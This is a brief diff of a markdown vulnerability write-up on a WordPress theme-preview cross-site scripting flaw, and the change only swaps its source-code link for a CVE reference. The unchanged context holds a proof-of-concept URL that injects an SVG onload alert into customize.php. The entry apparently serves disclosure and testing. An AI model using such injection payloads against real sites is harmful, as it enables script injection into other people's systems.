@@ -54,7 +54,7 @@ Legacy Theme Preview XSS
   Post ```http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(40)>```
   Alert 40 will pop up.
 
-  - [ ] Affected source code: https://github.com/WordPress/WordPress/blob/4.2-branch/wp-login.php
+  - [ ] Affected source code: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
   
 
 ## Assets
